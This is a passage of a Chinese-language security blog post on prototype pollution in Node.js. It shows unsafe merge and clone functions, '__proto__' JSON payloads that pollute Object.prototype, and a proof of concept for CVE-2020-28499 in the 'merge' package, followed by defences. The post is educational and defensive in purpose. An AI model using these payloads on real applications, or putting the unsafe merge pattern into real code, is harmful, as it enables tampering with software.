+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">elements</span>.<span style="color:#58a1dd">join</span>(<span style="color:#a6be9d">&#39;-&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: &#34;Fire-Air-Water&#34;
+</span></span></span></code></pre></div><h6 id="merge类操作导致原型链污染" class="heading-element"><span>0.0.0.4.5  Merge类操作导致原型链污染</span>
+  <a href="#merge%e7%b1%bb%e6%93%8d%e4%bd%9c%e5%af%bc%e8%87%b4%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>原型链污染的主要思想 实际上就是寻找能够操纵键值的位置 然后利用<strong>proto</strong>来向上污染</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">merge</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">a</span>, <span style="color:#58a1dd">b</span>) =&gt; {    <span style="color:#828b96;font-style:italic">// 发现 merge 危险操作
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>  <span style="color:#ff636f">for</span> (<span style="color:#ff636f">var</span> <span style="color:#58a1dd">attr</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">b</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">isObject</span>(<span style="color:#58a1dd">a</span>[<span style="color:#58a1dd">attr</span>]) <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">isObject</span>(<span style="color:#58a1dd">b</span>[<span style="color:#58a1dd">attr</span>])) {
+</span></span><span style="display:flex;"><span>      <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">a</span>[<span style="color:#58a1dd">attr</span>], <span style="color:#58a1dd">b</span>[<span style="color:#58a1dd">attr</span>]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#58a1dd">a</span>[<span style="color:#58a1dd">attr</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">b</span>[<span style="color:#58a1dd">attr</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">return</span> <span style="color:#58a1dd">a</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">clone</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">a</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">return</span> <span style="color:#58a1dd">merge</span>({}, <span style="color:#58a1dd">a</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在上面 我们使用了merge 进行操作 merge 方法用在merge操作 以及 clone操作中</p>
+<p>我们可以 利用merge来合并两个 复杂的对象 用clone创建一个 和现在对象相同的对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>, <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> (<span style="color:#ff636f">let</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">target</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>], <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>])
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">object1</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">object2</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parse</span>(<span style="color:#a6be9d">&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">object1</span>, <span style="color:#58a1dd">object2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">a</span>, <span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">b</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">object3</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object3</span>.<span style="color:#58a1dd">b</span>)</span></span></code></pre></div><p>merge有着合并的作用</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>, <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> (<span style="color:#ff636f">let</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">target</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>], <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>])
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">clone</span>(<span style="color:#58a1dd">a</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">return</span> <span style="color:#58a1dd">merge</span>({}, <span style="color:#58a1dd">a</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">object1</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parse</span>(<span style="color:#a6be9d">&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">clone</span>(<span style="color:#58a1dd">object1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">a</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">b</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">object2</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object2</span>.<span style="color:#58a1dd">b</span>)</span></span></code></pre></div><p>clone 也是一样的</p>
+<h6 id="mergerecursivemerge-cve-2020-28499" class="heading-element"><span>0.0.0.4.6  merge.recursiveMerge CVE-2020-28499</span>
+  <a href="#mergerecursivemerge-cve-2020-28499" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>影响2.1.1以下的merge版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">merge</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;merge&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">payload2</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parse</span>(<span style="color:#a6be9d">&#39;{&#34;x&#34;: {&#34;__proto__&#34;:{&#34;polluted&#34;:&#34;yes&#34;}}}&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">obj1</span> <span style="color:#ff636f">=</span> {<span style="color:#58a1dd">x</span><span style="color:#ff636f">:</span> {<span style="color:#58a1dd">y</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span>}};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;Before : &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">obj1</span>.<span style="color:#58a1dd">polluted</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">merge</span>.<span style="color:#58a1dd">recursive</span>(<span style="color:#58a1dd">obj1</span>, <span style="color:#58a1dd">payload2</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;After : &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">obj1</span>.<span style="color:#58a1dd">polluted</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;After : &#34;</span> <span style="color:#ff636f">+</span> {}.<span style="color:#58a1dd">polluted</span>);</span></span></code></pre></div><h5 id="修复" class="heading-element"><span>0.0.0.5  修复</span>
+  <a href="#%e4%bf%ae%e5%a4%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>1.Object.freeze()冻结原型</p>
+<p>1.Object.freeze(Object.prototype);
+2. Object.freeze(Object);
+3. ({}).<strong>proto</strong>.test = 123
+4. ({}).test // this will be undefined
+冻结原型后，无法添加新的原型至原型链</p>
+<p>2.对JSON 输入验证</p>
+<p>npm上有很多库，例如avj，可以对json数据验证，排除json数据中不需要的属性。</p>
+<p>或者在复制对象，遍历键名的时候，检查&quot;<strong>proto</strong>&ldquo;和&quot;constructor&quot;中&quot;prototype&rdquo;，因为constructor.prototype也可以操作原型链。</p>
+<p>3.使用map代替{}</p>
+<p>4.使用Object.create()安全创建对象</p>
+<ol>
+<li>var obj = Object.create(null);</li>
+<li>obj.<strong>proto</strong> // undefined</li>
+<li>obj.constructor // undefined
+这样创建的对象没有属性</li>
+</ol>
+<p>5.nodejs中可以通过&ndash;disable-proto直接禁止操作原型链</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/nodejs%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Nodejs安全">Nodejs安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/nodejs%E5%AE%89%E5%85%A8/17/" class="post-nav-item" rel="prev" title="Nodejs漏洞学习"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Nodejs漏洞学习</a>
+      <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/nginx/89/" class="post-nav-item" rel="next" title="Nginx学习">Nginx学习<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
